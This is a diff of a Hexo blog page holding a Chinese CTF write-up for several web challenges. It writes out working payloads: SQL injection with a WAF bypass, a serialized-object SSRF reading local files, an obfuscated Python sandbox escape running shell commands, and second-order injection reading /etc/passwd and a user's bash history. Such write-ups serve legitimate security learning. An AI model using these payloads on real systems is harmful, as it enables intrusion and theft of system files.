@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="," />
+  <meta name="keywords" content="CTF," />
 
 
 
@@ -81,9 +81,9 @@
 
 <meta name="description" content="0x00 fakebook题目页面是这样的大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：adzzzzmin&amp;#39; or if((1=1),sleep(10),0)#，但是后面发现，并不能注出什么东西出来。">
 <meta name="keywords" content="CTF">
-<meta property="og:type" content="website">
+<meta property="og:type" content="article">
 <meta property="og:title" content="网鼎杯WEB_writeup">
-<meta property="og:url" content="http://yoursite.com/网鼎杯WEB-writeup.html">
+<meta property="og:url" content="http://yoursite.com/2018/09/20/网鼎杯WEB-writeup/index.html">
 <meta property="og:site_name" content="C0mRaDe&#39;s Blog">
 <meta property="og:description" content="0x00 fakebook题目页面是这样的大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：adzzzzmin&amp;#39; or if((1=1),sleep(10),0)#，但是后面发现，并不能注出什么东西出来。">
 <meta property="og:locale" content="zh-hk">
@@ -190,7 +190,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/网鼎杯WEB-writeup.html"/>
+  <link rel="canonical" href="http://yoursite.com/2018/09/20/网鼎杯WEB-writeup/"/>
 
 
 
@@ -291,24 +291,108 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/网鼎杯WEB-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">网鼎杯WEB_writeup</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <h2 id="0x00-fakebook"><a href="#0x00-fakebook" class="headerlink" title="0x00 fakebook"></a>0x00 fakebook</h2><p>题目页面是这样的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/1.png" alt="image">大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：<code>adzzzzmin&#39; or if((1=1),sleep(10),0)#</code>，但是后面发现，并不能注出什么东西出来。<a id="more"></a><br>正解如下：在具体信息页面(view.php)no参数存在注入，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/2.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/3.png" alt="image">注出来有4列，第二列有回显<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/4.png" alt="image">，然后，常规操作，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/5.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/6.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/7.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/8.png" alt="image">注意要用<code>/**/</code>绕过对union select的waf。<br>注出data列的内容是一串php的序列化数据，想到构造序列化的数据去ssrf读取flag.php(之所以知道是flag.php，是因为可以试出来)，构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=1 and 1=2 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+          <h1 class="post-title" itemprop="name headline">网鼎杯WEB_writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-09-20T18:09:17+08:00">
+                2018-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-fakebook"><a href="#0x00-fakebook" class="headerlink" title="0x00 fakebook"></a>0x00 fakebook</h2><p>题目页面是这样的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/1.png" alt="image">大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：<code>adzzzzmin&#39; or if((1=1),sleep(10),0)#</code>，但是后面发现，并不能注出什么东西出来。<a id="more"></a><br>正解如下：在具体信息页面(view.php)no参数存在注入，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/2.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/3.png" alt="image">注出来有4列，第二列有回显<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/4.png" alt="image">，然后，常规操作，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/5.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/6.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/7.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/8.png" alt="image">注意要用<code>/**/</code>绕过对union select的waf。<br>注出data列的内容是一串php的序列化数据，想到构造序列化的数据去ssrf读取flag.php(之所以知道是flag.php，是因为可以试出来)，构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=1 and 1=2 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
 <p>这样，flag的内容就会在本来显示blog内容的地方显示出来。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/9.png" alt="image">这题其实算是比较友好的web题了，当时最后一个小时才看到，而且一开始以为是时间盲注，浪费了时间，可惜了。</p>
 <h2 id="0x01-calc"><a href="#0x01-calc" class="headerlink" title="0x01 calc"></a>0x01 calc</h2><p>进来之后，发现是一个计算器<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/10.png" alt="image">给了个正则，一开始没发现有什么问题，后面才看到，这正则没有结束符。。只要开头跟正则匹配了就ok，也就是说，可以构造一个1+1+任何东西，然后，乱输url，发现后台是python写的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/11.png" alt="image">自然想到沙箱逃逸。题目过滤了ls，稍微绕过就可以，另外，因为要和数字进行运算，所以沙箱逃逸返回的必须是数字类型，可以先编码成16进制，然后再用int函数转化为数字类型。用这个payload列目录：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>+int(([].__getattribute__(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>).__base__.__getattribute__([].__getattribute__(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>).__base__,<span class="string">'__subclas'</span>+<span class="string">'ses__'</span>)()[<span class="number">71</span>].__dict__[<span class="string">"__in"</span>+<span class="string">"it__"</span>].__getattribute__(<span class="string">"__global"</span>+<span class="string">"s__"</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'l'</span>+<span class="string">'s /'</span>).__getattribute__(<span class="string">'re'</span>+<span class="string">'ad'</span>)()).encode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/12.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/13.png" alt="image"><br>可以看到，flag就在/flag，改一下payload读flag即可。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/14.png" alt="image"></p>
@@ -335,15 +419,67 @@
 <p>首先我们可以看到题目，当你对某个帖子提交留言的时候，它会把你post过去的content显示出来，然后，我们看代码能否对content进行回显利用。发现这里存在一个二次注入，我们可以把发帖处的category构造为<code>&#39;,content=(select load_file(&#39;/etc/passwd&#39;)),</code>，然后，把留言处的content构造为<code>*/#</code>，这样出来的效果是这样子的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/72.png" alt="image">，这时候，网页上就会显示出content的内容。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/73.png" alt="image">然后，我尝试了一下读/flag，发现没东西。这时候看到<code>/etc/passwd</code>里面有一个www用户，然后，我们可以读<code>/home/www/.bash_history</code>，看看该用户都干过什么。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/74.png" alt="image">根据他的操作记录，可以知道他在tmp目录解压了html.zip，然后到<code>/var/www/html</code>删掉了<code>.DS_Store</code>，这个<code>.DS_Store</code>应该十分关键，于是，读一下<code>/tmp/html/.DS_Store</code>，直接读是不行的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/75.png" alt="image">于是，先拿hex编码一下。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/76.png" alt="image">可以看到，有一个<code>flag_8946e1ff1ee3e40f.php</code>，然后同样的读取就可以get flag。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/77.png" alt="image"></p>
 <h2 id="0x10-blog"><a href="#0x10-blog" class="headerlink" title="0x10 blog"></a>0x10 blog</h2><p>题目描述：find the flag.<br>题目给了一个wordpress的站，看了下版本，搜了一下，是最新的，没有可以利用的漏洞<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/65.png" alt="image">but，首页上写着几个大字：’该博客为青龙鼎科技(qinglongdingkeji.com)官方技术博客。于是，可以到github上搜一下这个青龙鼎科技，在code处可以看到搜到了东西<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/66.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/67.png" alt="image">有一个api.php，泄露了api信息，于是尝试遍历一下uid，可以看到，uid=233的时候返回长度是最大的，点开看看，发现就有flag<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/68.png" alt="image"></p>
 
-        
-      </div>
-      
-      
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/20/PHP弱类型的一些总结/" rel="next" title="PHP弱类型的一些总结">
+                <i class="fa fa-chevron-left"></i> PHP弱类型的一些总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/20/命令执行技巧/" rel="prev" title="命令执行技巧">
+                命令执行技巧 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -405,7 +541,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">文章</span>
                 </a>
               </div>
@@ -427,7 +563,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">標籤</span>
                 </a>
               </div>
